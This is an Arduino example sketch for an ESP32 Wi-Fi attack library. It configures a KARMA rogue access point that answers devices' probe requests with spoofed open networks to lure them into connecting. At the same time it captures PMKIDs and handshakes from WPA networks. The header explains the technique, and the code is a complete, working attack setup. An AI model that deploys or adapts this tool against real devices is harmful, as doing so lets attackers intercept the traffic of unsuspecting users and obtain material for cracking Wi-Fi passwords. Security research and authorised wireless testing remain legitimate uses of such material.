/*
 * KarmaResponder.ino
 *
 * Demonstrates the KARMA rogue AP responder in the Politician library.
 *
 * ── What is KARMA? ─────────────────────────────────────────────────────────
 * KARMA exploits the 802.11 probe request / probe response mechanism.
 * When a device has previously connected to a network, its Wi-Fi stack
 * periodically sends named probe requests looking for that network. Any AP
 * that replies with a matching probe response can trick the device into
 * auto-associating — even if the original network is out of range.
 *
 * This implementation:
 *   1. Listens for named probe requests (non-wildcard SSIDs)
 *   2. Injects a matching probe response + beacon with a spoofed open AP MAC
 *   3. Fires KarmaCb with the client MAC, SSID, and spoofed AP MAC
 *   4. Deduplicates — will not respond to the same (client, SSID) pair
 *      more than once every 10 seconds
 *
 * cfg.karma_open_only = true (default): the engine skips SSIDs already cached
 * as WPA-protected APs — avoids wasting responses on secured networks where
 * the client will reject the open association.
 *
 * ── What happens after association? ────────────────────────────────────────
 * The ESP32's soft AP (always running in APSTA mode) accepts the connection.
 * Captured EAPOL / HTTP / DNS traffic can be examined from the AP event handler
 * or by running a lightweight captive portal (not included here).
 *
 * ── Combine with passive PMKID fishing ─────────────────────────────────────
 * Setting ATTACK_PMKID | ATTACK_PASSIVE alongside KARMA means the engine
 * simultaneously fishes PMKIDs from encrypted APs while luring open-network
 * clients with KARMA responses — no wasted cycles.
 *
 * ── Compile-time disable ────────────────────────────────────────────────────
 * Add -DPOLITICIAN_NO_KARMA to build_flags to strip all KARMA code.
 */

#include <Arduino.h>
#include <Politician.h>

using namespace politician;

Politician engine;

// ─── KARMA Callback ───────────────────────────────────────────────────────────

void onKarma(const KarmaRecord &rec) {
    Serial.printf("\n[KARMA] Client %02X:%02X:%02X:%02X:%02X:%02X probed for \"%.*s\"\n",
        rec.client[0], rec.client[1], rec.client[2],
        rec.client[3], rec.client[4], rec.client[5],
        rec.ssid_len, rec.ssid);
    Serial.printf("        Responded as AP %02X:%02X:%02X:%02X:%02X:%02X on ch%d\n",
        rec.ap_mac[0], rec.ap_mac[1], rec.ap_mac[2],
        rec.ap_mac[3], rec.ap_mac[4], rec.ap_mac[5],
        rec.channel);
    Serial.printf("        RSSI: %d dBm  Vendor: %s\n",
        rec.rssi, Politician::getVendor(rec.client));
}

// ─── Handshake Callback (bonus: capture PMKIDs while KARMA runs) ──────────────

void onHandshake(const HandshakeRecord &rec) {
    Serial.printf("[PMKID] Captured from \"%s\" (%s)\n",
        rec.ssid, Politician::getVendor(rec.bssid));
}

// ─── Setup ───────────────────────────────────────────────────────────────────

void setup() {
    Serial.begin(115200);
    delay(2000);
    Serial.println("\n--- Politician: KARMA Rogue AP Responder Example ---");
    Serial.println("Listening for probe requests and echoing SSIDs...\n");

    Config cfg;
    cfg.smart_hopping   = true;
    cfg.karma_enabled   = true;    // Enable KARMA on startup
    cfg.karma_open_only = true;    // Skip SSIDs we've seen as WPA networks
    cfg.karma_max_ssids = 16;      // Dedup table size

    if (engine.begin(cfg) != politician::OK) {
        Serial.println("[ERROR] WiFi init failed!");
        while (1) delay(100);
    }

    engine.setKarmaCallback(onKarma);
    engine.setEapolCallback(onHandshake);

    // KARMA works alongside passive capture and PMKID fishing — no conflict
    engine.setAttackMask(ATTACK_PASSIVE | ATTACK_PMKID);
    engine.startHopping();

    Serial.println("Engine started. KARMA responder active.");
    Serial.println("Probe requests with named SSIDs will receive a matching response.\n");
}

// ─── Loop ────────────────────────────────────────────────────────────────────

void loop() {
    engine.tick();

    // Toggle KARMA at runtime via Serial command
    if (Serial.available()) {
        char cmd = Serial.read();
        if (cmd == 'k') {
            static bool karmaOn = true;
            karmaOn = !karmaOn;
            engine.enableKarma(karmaOn);
            Serial.printf("[KARMA] %s\n", karmaOn ? "Enabled" : "Disabled");
        }
    }
}
